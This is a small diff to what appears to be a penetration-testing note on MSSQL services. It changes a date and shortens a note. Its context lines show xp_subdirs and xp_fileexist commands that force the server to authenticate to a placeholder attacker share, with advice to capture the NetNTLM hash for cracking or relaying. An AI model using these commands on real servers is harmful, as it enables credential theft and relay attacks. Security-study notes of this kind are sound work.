@@ -1,6 +1,6 @@
 ---
 created: 2026-09-22
-updated: 2026-10-09
+updated: 2026-10-18
 tags:
   - services_n_protocols
 ---
@@ -431,7 +431,7 @@ EXEC master..xp_subdirs '\\<attacker_ip_address>\share';
 EXEC master..xp_fileexist '\\<attacker_ip_address>\share\file';
 ```
 
->[!note] Capture the resulting NetNTLM hash with [[🛠️ Responder]] (or a listener seeded by [[LLMNR & NBT-NS poisoning]]) for offline cracking, or relay it to another host. See [[🛠️ NTLM]] for the authentication mechanics and [[Hashcat]] for cracking captured hashes.
+>[!note] Capture the resulting NetNTLM hash with [[🛠️ Responder]] (or a listener seeded by [[LLMNR & NBT-NS poisoning]]) for offline cracking, or relay it to another host.
 
 ## Reading files with OPENROWSET
 
